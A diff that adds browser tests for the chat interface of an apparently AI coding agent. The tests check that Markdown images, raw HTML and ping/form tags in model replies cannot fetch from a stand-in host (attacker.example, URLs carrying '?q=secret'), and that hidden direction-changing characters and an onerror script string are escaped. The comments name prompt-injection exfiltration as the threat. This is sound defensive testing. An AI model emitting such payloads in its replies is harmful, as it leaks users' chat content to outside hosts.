@@ -822,3 +822,284 @@ def test_a_turns_last_reply_shows_its_result_summary(ui, page):
         "1 call without price data not in the DBU estimate. Changed: src/app.py, README.md and 3 more.")
     # A count no call reported shows '—', never 0; no DBU part without price data.
     expect(footers.nth(1).locator("summary")).to_have_text("Turn summary: 1 step · 0 tools · 4 s · — in / 12 out")
+
+
+# A reply, a plan and a side answer render model text as Markdown. None of them may make the browser fetch an address
+# by itself: a prompt injection could otherwise send chat content to any host with no click.
+EXTERNAL = "https://attacker.example/**"
+
+
+def watch_external(page):
+    """Record every request to the attacker host (and answer it with an empty image)."""
+    requests = []
+
+    def block(route):
+        requests.append(route.request.url)
+        route.fulfill(status=200, body=b"", content_type="image/png")
+
+    page.route(EXTERNAL, block)
+    page.route("https://other.example/**", block)
+    page.route("http://attacker.example/**", block)
+    return requests
+
+
+def show_reply(ui, page, text: str):
+    """Render one assistant reply with this Markdown (a JavaScript string literal body) and wait until it is in."""
+    show(ui, f"[{{ id: 'reply', type: 'assistant', text: {json.dumps(text)} }}]")
+    expect(page.locator(".markdown")).to_be_visible()
+    page.wait_for_function("() => [...document.images].every(image => image.complete)")
+
+
+def test_markdown_image_in_a_reply_is_not_fetched_from_the_web(ui, page):
+    external = watch_external(page)
+    show_reply(ui, page, "Done.\n\n![x](https://attacker.example/pixel.png?q=project-secret)")
+    expect(page.locator(".markdown")).to_contain_text("Done.")
+    assert external == [], f"the reply made the browser request: {external}"
+
+
+def test_a_withheld_image_shows_its_description_and_host_as_text(ui, page):
+    external = watch_external(page)
+    show_reply(ui, page, "![A chart](https://attacker.example/pixel.png?q=secret)")
+    note = page.locator(".markdown .file-preview-blocked")
+    expect(note).to_have_text('Image not loaded from attacker.example: "A chart"')
+    assert note.get_attribute("data-src") == "https://attacker.example/pixel.png?q=secret"
+    assert page.locator(".markdown img").count() == 0
+    assert external == []
+
+
+@pytest.mark.parametrize("markdown, host", [
+    ("![p](//attacker.example/x.png)", "attacker.example"),
+    ("![r][ref]\n\n[ref]: https://attacker.example/x.png", "attacker.example"),
+    ("![p](http://attacker.example/x.png)", "attacker.example"),
+    ("![p](ftp://attacker.example/x.png)", "attacker.example"),
+])
+def test_other_ways_to_write_a_web_image_are_withheld_too(ui, page, markdown, host):
+    external = watch_external(page)
+    show_reply(ui, page, markdown)
+    expect(page.locator(".markdown .file-preview-blocked")).to_contain_text(f"Image not loaded from {host}: ")
+    assert page.locator(".markdown img[src]").count() == 0
+    assert external == []
+
+
+def test_an_image_inside_a_link_is_withheld_and_the_link_stays(ui, page):
+    external = watch_external(page)
+    show_reply(ui, page, "[![logo](https://attacker.example/i.png)](https://other.example/page)")
+    link = page.locator(".markdown a")
+    expect(link).to_have_attribute("href", "https://other.example/page")
+    expect(link.locator(".file-preview-blocked")).to_have_text('Image not loaded from attacker.example: "logo"')
+    assert external == []
+
+
+@pytest.mark.parametrize("raw", [
+    '<img src="https://attacker.example/a.png">',
+    '<img srcset="https://attacker.example/a.png 2x" src="x.png">',
+    '<video poster="https://attacker.example/a.png"></video>',
+    '<audio src="https://attacker.example/a.mp3"></audio>',
+    '<picture><source srcset="https://attacker.example/a.png"><img></picture>',
+    '<svg><image href="https://attacker.example/a.png"></image></svg>',
+    '<p style="background:url(https://attacker.example/a.png)">styled</p>',
+    '<link rel="stylesheet" href="https://attacker.example/a.css">',
+    '<iframe src="https://attacker.example/"></iframe>',
+    '<object data="https://attacker.example/a.png"></object>',
+    '<embed src="https://attacker.example/a.png">',
+    '<input type="image" src="https://attacker.example/a.png">',
+    '<body background="https://attacker.example/a.png">',
+])
+def test_raw_html_in_a_reply_is_text_and_fetches_nothing(ui, page, raw):
+    external = watch_external(page)
+    show_reply(ui, page, f"Before\n\n{raw}\n\nAfter")
+    expect(page.locator(".markdown")).to_contain_text("attacker.example")  # Shown as text, not run.
+    assert page.locator(".markdown :is(img, video, audio, source, svg, iframe, object, embed, input, link)").count() == 0
+    assert external == []
+
+
+def test_a_data_image_in_a_reply_still_renders(ui, page):
+    png = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=="
+    show_reply(ui, page, f"![dot]({png})")
+    image = page.locator(".markdown img")
+    expect(image).to_have_attribute("src", png)
+    assert page.locator(".markdown .file-preview-blocked").count() == 0
+    assert page.evaluate("() => document.querySelector('.markdown img').naturalWidth") == 1
+
+
+def test_a_plan_withholds_web_images(ui, page):
+    external = watch_external(page)
+    plan = "## Steps\n\n![diagram](https://attacker.example/p.png?q=secret)"
+    ui.mount("components/PlanCard.js", f"""{{ sessionId: 's1', onError: fake.spy('onError'),
+      event: {{ id: 'p1', type: 'tool', name: 'submit_plan', state: 'pending', input: {{ plan: {json.dumps(plan)} }} }} }}""", setup=SETUP)
+    expect(page.locator(".plan-card .file-preview-blocked")).to_have_text('Image not loaded from attacker.example: "diagram"')
+    page.wait_for_function("() => [...document.images].every(image => image.complete)")
+    assert page.locator(".plan-card img").count() == 0
+    assert external == []
+
+
+def test_a_side_answer_withholds_web_images(ui, page):
+    external = watch_external(page)
+    answer = "It is ![pixel](https://attacker.example/p.png?q=secret) here."
+    ui.mount("components/SideAnswer.js", f"{{ side: {{ question: 'What?', answer: {json.dumps(answer)} }}, onDismiss: fake.spy('d'), onError: fake.spy('e') }}",
+             setup=SETUP)
+    expect(page.locator(".side-answer .file-preview-blocked")).to_have_text('Image not loaded from attacker.example: "pixel"')
+    page.wait_for_function("() => [...document.images].every(image => image.complete)")
+    assert page.locator(".side-answer img").count() == 0
+    assert external == []
+
+
+# The text that stands in for a withheld image: the host first, the description quoted and escaped
+
+def placeholder_of(ui, page, markdown: str) -> str:
+    external = watch_external(page)
+    show_reply(ui, page, markdown)
+    assert external == []
+    return page.locator(".markdown .file-preview-blocked").first.text_content()
+
+
+def test_a_description_that_looks_like_a_host_cannot_be_mistaken_for_the_host(ui, page):
+    text = placeholder_of(ui, page, "![logo (github.com)](https://attacker.example/x.png)")
+    assert text == 'Image not loaded from attacker.example: "logo (github.com)"'
+
+
+def test_a_description_with_a_direction_change_is_escaped_and_quoted(ui, page):
+    text = placeholder_of(ui, page, "![a‮b](https://attacker.example/x.png)")
+    assert text == 'Image not loaded from attacker.example: "a\\u202eb"'
+    assert "‮" not in page.locator(".markdown").text_content()
+
+
+@pytest.mark.parametrize("length, cut", [(130, True), (120, False)])
+def test_a_long_description_is_cut_at_120_characters(ui, page, length, cut):
+    text = placeholder_of(ui, page, f"![{'x' * length}](https://attacker.example/x.png)")
+    assert text == f'Image not loaded from attacker.example: "{"x" * 120}{"…" if cut else ""}"'
+
+
+@pytest.mark.parametrize("markdown, expected", [
+    ("![diagram](img/a.png)", 'Image not loaded: "diagram"'),
+    ("![](https://attacker.example/x.png)", "Image not loaded from attacker.example: no description"),
+    ("![](img/a.png)", "Image not loaded: no description"),
+])
+def test_a_relative_source_or_a_missing_description_has_its_own_wording(ui, page, markdown, expected):
+    assert placeholder_of(ui, page, markdown) == expected
+
+
+def test_a_placeholder_is_text_never_markup(ui, page):
+    text = placeholder_of(ui, page, "![<b>bold</b> <img src=x onerror=window.pwned=1>](https://attacker.example/x.png)")
+    assert text == 'Image not loaded from attacker.example: "<b>bold</b> <img src=x onerror=window.pwned=1>"'
+    assert page.locator(".markdown .file-preview-blocked").first.locator("*").count() == 0
+    assert ui.js("window.pwned === undefined")
+
+
+# The sanitizer alone (the reply configuration), with raw HTML a reply could never reach it with
+
+SANITIZER_CASES = [
+    ("img-src", "<img src=https://attacker.example/a.png>", [r"(?<![\w-])src="], ["data-src"]),
+    ("img-srcset", "<img srcset='https://attacker.example/a.png 2x'>", [r"srcset", r"attacker"], []),
+    ("video-poster", "<video poster=https://attacker.example/a.png></video>", [r"<video", r"poster", r"attacker"], []),
+    ("audio", "<audio src=https://attacker.example/a.mp3></audio>", [r"<audio", r"attacker"], []),
+    ("picture-source", "<picture><source srcset=https://attacker.example/a.png></picture>", [r"<picture", r"<source", r"srcset", r"attacker"], []),
+    ("svg-image", "<svg><image href=https://attacker.example/a.png></image></svg>", [r"<svg", r"<image", r"attacker"], []),
+    ("style", "<p style='background:url(https://attacker.example/b.png)'>styled</p>", [r"style=", r"url\(", r"attacker"], ["styled"]),
+    ("link", "<link rel=prefetch href=https://attacker.example/a.css>", [r"<link", r"attacker"], []),
+    ("iframe", "<iframe src=https://attacker.example/></iframe>", [r"<iframe", r"attacker"], []),
+    ("object", "<object data=https://attacker.example/a.png></object>", [r"<object", r"attacker"], []),
+    ("embed", "<embed src=https://attacker.example/a.png>", [r"<embed", r"attacker"], []),
+    ("input-image", "<input type=image src=https://attacker.example/a.png>", [r"<input", r"attacker"], []),
+    ("form-action", "<form action=https://attacker.example/post><b>x</b></form>", [r"<form", r"action", r"attacker"], ["<b>x</b>"]),
+    ("ping", "<a href=https://other.example/p ping=https://attacker.example/track>link</a>", [r"ping", r"attacker"], ["link"]),
+]
+
+
+@pytest.mark.parametrize("raw, gone, kept", [case[1:] for case in SANITIZER_CASES], ids=[case[0] for case in SANITIZER_CASES])
+def test_the_reply_sanitizer_removes_everything_that_fetches(ui, page, raw, gone, kept):
+    external = watch_external(page)
+    ui.start()
+    result = ui.js(f"import('/static/js/markdown.js').then(({{ sanitizeReply }}) => sanitizeReply({json.dumps(raw)}))")
+    for pattern in gone:
+        assert not re.search(pattern, result, re.I), f"{pattern!r} survives in {result!r}"
+    for text in kept:
+        assert text in result, f"{text!r} is missing from {result!r}"
+    # Put the result in the page: nothing may be requested.
+    page.evaluate("html => { const box = document.createElement('div'); box.innerHTML = html; document.body.append(box) }", result)
+    page.wait_for_function("() => [...document.images].every(image => image.complete)")
+    assert external == []
+
+
+# Hidden characters in the parts of a waiting card that are not its command
+
+HIDDEN_NOTE = "Hidden or direction-changing characters are shown as \\u escapes."
+
+
+def test_the_activity_list_escapes_the_subject_of_a_pending_card_only(ui, page):
+    show(ui, "[{ id: 'wait', type: 'tool', name: 'run_command', state: 'pending', input: { command: 'echo a\\u202eb' }, preview: 'echo a\\u202eb' },"
+             " { id: 'done', type: 'tool', name: 'run_command', state: 'completed', input: { command: 'echo c\\u202ed' }, output: 'ok' }]")
+    subjects = page.locator(".activity-summary .activity-subject")
+    expect(subjects.first).to_have_text(" · echo a\\u202eb")
+    assert "‮" not in subjects.first.text_content()
+    assert "‮" in subjects.last.text_content()  # What already ran is shown as it is.
+
+
+def test_a_siblings_agent_type_is_escaped_on_a_pending_card(ui, page):
+    show(ui, "[{ id: 'edit', type: 'tool', name: 'edit_file', state: 'pending', input: { path: 'a.txt' }, preview: 'diff', "
+             "sibling_change: { subagent_id: 'abcdef12', agent_type: 'rev\\u202eiew', path: 'a.txt' } }]")
+    card = page.locator(".tool-card")
+    expect(card.locator(".tool-sibling")).to_contain_text("Another subagent of this chat (rev\\u202eiew, abcdef12)")
+    expect(card.get_by_text(HIDDEN_NOTE, exact=True)).to_have_count(1)
+    assert "‮" not in card.text_content()
+    page.get_by_role("button", name="Approve", exact=True).click()
+    ui.wait("fake.calls.length === 1")
+    assert ui.bodies("/api/sessions/parent/approvals/edit", "POST") == [{"allowed": True}]
+
+
+def test_the_card_a_subagent_waits_on_is_escaped_in_the_parent_and_answered_unchanged(ui, page):
+    pending = {"event_id": "ev-1", "name": "run_command", "kind": "approval", "title": "echo a‮b", "warnings": ["w‮x"]}
+    event = {"id": "d", "type": "tool", "name": "delegate_task", "input": {"task": "Fix"}, "state": "running", "child_session_id": "child-1",
+             "delegation": {"status": "awaiting_approval", "completed_tools": 1, "agent_type": "editor", "pending": pending}}
+    show(ui, json.dumps([event]))
+    progress = page.get_by_label("Subagent progress")
+    expect(progress.locator(".subagent-pending")).to_have_text("Waits for approval: run command · echo a\\u202eb")
+    expect(progress.locator(".subagent-pending-warning")).to_have_text("Its card warns: w\\u202ex.")
+    expect(progress.get_by_text(HIDDEN_NOTE, exact=True)).to_have_count(1)
+    assert "‮" not in progress.text_content()
+    assert "‮" not in (progress.locator(".subagent-pending").get_attribute("title") or "")
+    progress.get_by_role("button", name="Allow", exact=True).click()
+    page.wait_for_function("fake.requests('/api/sessions/child-1/approvals/ev-1', 'POST').length === 1")
+    assert ui.bodies("/api/sessions/child-1/approvals/ev-1", "POST") == [{"allowed": True}]
+    pending.update(kind="question", title="Which‮?")
+    ui.rerender(f"{{ session: makeSession({json.dumps([{**event, 'delegation': {**event['delegation'], 'pending': pending}}])}), onError: fake.spy('onError'), onSelectSession: fake.spy('select') }}")
+    expect(progress.locator(".subagent-pending")).to_have_text("Asks: Which\\u202e?")
+
+
+# The heading of a pending card escapes first and flattens ordinary white space only
+
+def test_the_heading_of_a_pending_card_shows_an_ideographic_space_as_an_escape(ui, page):
+    show(ui, "[{ id: 'wait', type: 'tool', name: 'run_command', state: 'pending', input: { command: 'echo a\\u3000b' }, preview: 'echo a\\u3000b' }]")
+    heading = page.locator(".tool-card .tool-subject")
+    expect(heading).to_have_text("echo a\\u3000b")
+    expect(heading.locator(".hidden-char")).to_have_count(1)
+    expect(page.get_by_label("Command", exact=True).first).to_contain_text("echo a\\u3000b")
+
+
+def test_the_heading_of_a_pending_card_still_flattens_ordinary_white_space(ui, page):
+    show(ui, "[{ id: 'wait', type: 'tool', name: 'run_command', state: 'pending', input: { command: 'echo a\\n\\t  b' }, preview: 'echo a\\n\\t  b' }]")
+    expect(page.locator(".tool-card .tool-subject")).to_have_text("echo a b")
+    expect(page.locator(".tool-card .hidden-char")).to_have_count(0)
+
+
+# The host in the text of a withheld image is the host of the resolved address, shown unless it is this page's
+
+@pytest.mark.parametrize("markdown, expected", [
+    ("![a](https:attacker.example/a.png)", 'Image not loaded from attacker.example: "a"'),
+    ("![a](/img/a.png)", 'Image not loaded: "a"'),
+    ("![a](http:a.png)", 'Image not loaded: "a"'),
+    ("![a](http://localhost:8799/a.png)", 'Image not loaded: "a"'),
+])
+def test_the_placeholder_names_the_host_unless_the_address_is_on_this_page(ui, page, markdown, expected):
+    assert placeholder_of(ui, page, markdown) == expected
+
+
+def test_a_very_long_host_is_cut_at_80_characters(ui, page):
+    host = f"{'a' * 60}.{'b' * 60}.example"
+    text = placeholder_of(ui, page, f"![x](https://{host}/x.png)")
+    assert text == f'Image not loaded from {host[:80]}…: "x"'
+
+
+def test_a_quote_in_a_description_cannot_close_the_quotes(ui, page):
+    text = placeholder_of(ui, page, '![x" from evil.example: "y](https://attacker.example/x.png)')
+    assert text == 'Image not loaded from attacker.example: "x\\" from evil.example: \\"y"'
